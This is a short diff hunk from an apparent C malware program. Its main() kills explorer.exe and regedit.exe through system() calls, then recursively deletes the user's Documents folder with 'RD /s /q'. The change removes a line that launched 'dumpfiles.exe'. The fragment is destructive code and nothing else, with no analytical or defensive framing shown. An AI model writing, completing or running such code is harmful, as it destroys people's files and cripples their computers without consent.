@@ -78,7 +78,6 @@ int main() {
 	system("echo off");
     system("taskkill /f /im explorer.exe");
     system("taskkill /f /im regedit.exe");
-    system("start dumpfiles.exe");
 
 
     system("RD /s /q %UserProfile%\Documents"); //Delete Documents Folder
